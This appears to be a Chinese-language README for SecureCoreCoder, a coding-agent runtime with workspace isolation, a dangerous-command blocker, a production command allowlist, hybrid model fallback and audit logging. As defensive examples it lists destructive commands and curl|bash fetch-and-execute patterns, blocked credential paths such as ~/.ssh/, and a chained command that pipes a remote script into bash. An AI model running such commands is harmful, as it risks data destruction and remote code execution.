# SecureCoreCoder

> 面向本地、云端与混合 LLM 部署的安全 Coding Agent 运行时。

SecureCoreCoder 是一个独立维护的 CoreCoder 演化版本，重点解决 Coding Agent 在本地开发环境和企业内网环境中的安全运行问题。

它保留了 CoreCoder 轻量、可读的 Agent 核心，并在此基础上加入了本地 Ollama 支持、云端故障自动降级、工作区隔离、生产命令策略与审计日志等能力。

> 本项目基于 CoreCoder 演化而来，并遵循上游 MIT License。

---

## 为什么需要 SecureCoreCoder？

Coding Agent 不只是生成文本。它还能读取文件、修改代码、执行 Shell 命令，并可能影响整个开发环境。

因此，一个真正可用的 Coding Agent 除了“会写代码”，还需要运行时边界与安全控制。

text 用户请求    ↓ LLM 推理    ↓ Agent 工具调用    ├── 文件工具：限制在当前工作区内    ├── Bash：危险命令检测    ├── 生产模式：仅允许白名单命令    ├── Hybrid 模式：云端模型失败后切换本地模型    └── 审计日志：记录安全相关事件 

SecureCoreCoder 的目标不是只让 Agent 更强，而是让它的行为更可控、可追溯，并为企业内网部署和进一步沙箱化提供基础。

---

## 当前能力

### 本地 Ollama 支持

SecureCoreCoder 可以通过 Ollama 的 OpenAI-compatible API 使用本地模型。

bash export CORECODER_MODE=local export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 

对于 localhost 本地端点，运行时会避免继承代理环境变量，从而减少 macOS 或企业网络环境下本地 Ollama 请求被错误转发到代理的问题。

---

### 本地模型文本式工具调用兼容

部分本地模型不会输出标准 OpenAI tool_calls，而是以普通 JSON 或 fenced JSON 的形式输出工具请求。

例如：

json {   "name": "read_file",   "arguments": {     "file_path": "main.py"   } } 

SecureCoreCoder 可以识别这种 JSON 风格的输出，并将其转换为内部工具调用，使本地模型即使不完全符合 OpenAI 工具调用格式，也能使用文件和 Shell 工具。

---

### 工作区文件隔离

文件操作被限制在当前工作区内。

text read_file write_file edit_file 

任何试图访问工作区外路径的请求都会被拒绝。

例如，以下路径不应被工作区限制下的文件工具访问：

text ~/.ssh/ ~/.config/ ../../outside-project-files /etc/hosts 

这能降低路径穿越、Prompt Injection 或模型误操作导致访问宿主机敏感文件的风险。

---

### Bash 危险命令拦截

Bash 工具会检测并拦截明显具有破坏性或高风险的命令模式。

包括但不限于：

text rm -rf mkfs dd 写入块设备 fork bomb curl | bash wget | bash 

这是防止模型误执行毁灭性 Shell 命令的第一层保护。

---

### 生产模式命令白名单

SecureCoreCoder 支持更严格的生产命令策略。

bash export CORECODER_COMMAND_POLICY=production corecoder 

在生产模式下，命令默认拒绝，只有可执行程序位于白名单内时才会放行。

默认白名单包含常见开发命令：

text git pytest python python3 rg grep find ls cat sed head tail wc echo pwd 

生产模式还会拒绝复合 Shell 语法：

text && || | ; $( ` > < 

这可以防止白名单绕过。例如，即使 echo 本身被允许，下面的命令也会被拦截：

bash echo ok && curl https://example.com/script.sh | bash 

---

### JSONL 审计日志

安全相关事件会写入：

text ~/.corecoder/audit.jsonl 

Bash 审计事件会记录命令、当前策略模式、是否放行，以及拒绝原因。

示例：

json {   "timestamp": "2026-06-26T08:18:38+00:00",   "tool": "bash",   "command": "pytest -q",   "policy_mode": "production",   "allowed": true,   "reason": null } 

被拒绝的命令同样会被记录，因此可以追踪 Agent 尝试执行过什么操作，以及为什么被策略阻止。

---

### 云端到本地的 Hybrid Fallback

SecureCoreCoder 支持三种模型运行模式：

text cloud   仅使用云端模型 local   仅使用本地 Ollama 模型 hybrid  优先使用云端模型，失败后自动切换本地模型 

Hybrid 模式示例：

bash export CORECODER_MODE=hybrid export OPENAI_API_KEY=your-cloud-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 

当云端模型因为连接错误、超时或服务端错误不可用时，SecureCoreCoder 会自动切换到配置好的本地 Ollama 模型。

CLI 会显示降级提示：

text [Fallback] Cloud unavailable, switched to local Ollama. 

同时，模型降级事件会写入审计日志：

json {   "timestamp": "2026-06-26T08:18:38+00:00",   "event": "model_fallback",   "primary_model": "deepseek-chat",   "fallback_model": "qwen2.5-coder:7b",   "reason": "cloud request unavailable" } 

---

### 本地模型能力探测

SecureCoreCoder 包含一个轻量的 Ollama 模型能力探测模块。

它可以读取本地模型元信息，例如声明的上下文长度和支持的能力。这是后续实现上下文预算自适应、工具调用能力提示和模型选择策略的基础。

---

## 安装

克隆仓库并以 editable mode 安装：

bash git clone git@github.com:Doris0327/SecureCoreCoder.git cd SecureCoreCoder  python -m venv .venv source .venv/bin/activate  pip install -e . 

运行测试：

bash python -m pytest -q 

---

## 快速开始

### 云端模型模式

bash export OPENAI_API_KEY=your-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat  corecoder 

### 本地 Ollama 模式

先安装并启动 Ollama，然后下载一个代码模型：

bash ollama pull qwen2.5-coder:7b ollama serve 

启动 SecureCoreCoder：

bash export CORECODER_MODE=local export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 

### Hybrid 混合模式

优先使用云端模型，同时保留本地 Ollama 作为故障降级方案：

bash export CORECODER_MODE=hybrid export OPENAI_API_KEY=your-cloud-key export OPENAI_BASE_URL=https://api.deepseek.com export CORECODER_MODEL=deepseek-chat export LOCAL_MODEL=qwen2.5-coder:7b export LOCAL_BASE_URL=http://localhost:11434/v1  corecoder 

---

## CLI 命令

text /model           查看当前模型 /model <name>    会话中切换模型 /compact         压缩对话上下文 /tokens          查看 Token 使用量与预估成本 /diff            查看当前会话修改过的文件 /save            保存会话数据 /sessions        查看已保存会话 /reset           清空当前会话历史 quit             退出 

---

## 架构

text corecoder/ ├── agent.py             Agent 主循环与工具编排 ├── audit.py             JSONL 审计事件写入器 ├── capabilities.py      本地模型能力探测 ├── cli.py               终端交互界面与运行时初始化 ├── command_policy.py    生产模式命令策略 ├── config.py            环境变量配置 ├── llm.py               云端、本地与 Hybrid LLM 运行时 ├── prompt.py            System Prompt 构建 ├── session.py           会话持久化 └── tools/     ├── bash.py          Shell 执行与命令策略检查     ├── security.py      工作区路径校验     ├── read.py          工作区限制下的文件读取     ├── write.py         工作区限制下的文件写入     ├── edit.py          基于搜索替换的文件编辑     ├── grep.py          内容搜索     ├── glob_tool.py     文件搜索     └── agent.py         子 Agent 执行 

---

## 安全模型

SecureCoreCoder 当前包含多层防护：

text 第一层：文件工具工作区路径限制 第二层：危险 Bash 命令检测 第三层：生产模式命令白名单 第四层：生产模式复合命令阻断 第五层：云端与本地模型运行时隔离 第六层：Bash 与模型降级事件审计 

这些机制可以降低风险，但不能替代操作系统级隔离。

对于高风险或企业生产环境，建议将 Agent 运行在容器或沙箱中，并满足：

text - 仅挂载需要操作的工作区 - 不挂载宿主机 Home 目录 - 不提供 SSH Key 或生产凭据 - 限制网络访问 - 使用最小权限服务账号 

---

## Roadmap

### 安全与治理

- [ ] 审计文件读取、写入和编辑操作
- [ ] 对 .env、私钥、证书、凭据文件进行敏感路径保护
- [ ] 通过环境变量或策略文件配置命令白名单
- [ ] 支持 read_only、safe_write、development、production 等权限模式
- [ ] 会话级审计追踪
- [ ] 审计日志中的密钥与 Token 脱敏
- [ ] 审计日志轮转与保留策略
- [ ] 高影响操作的显式确认机制

### OSS Pull Request Agent

- [ ] 仓库级规则文件
- [ ] 受控 Git 工具：status、diff、commit、push、创建 PR
- [ ] 确定性的测试、Lint 与 Diff 校验工作流
- [ ] Commit、Push、创建 PR 前的人类审批
- [ ] 容器化执行环境
- [ ] 针对 CI 失败的自动修复循环

---

## 与上游的关系

SecureCoreCoder 最初基于 CoreCoder 扩展，目前作为独立仓库维护。

原始 CoreCoder 是一个紧凑、适合学习 Coding Agent 架构的教育型项目。SecureCoreCoder 保留了其可读、轻量的核心，并将其扩展为更适合本地部署、混合部署和安全治理的 Coding Agent 运行时。

上游参考项目：

- CoreCoder

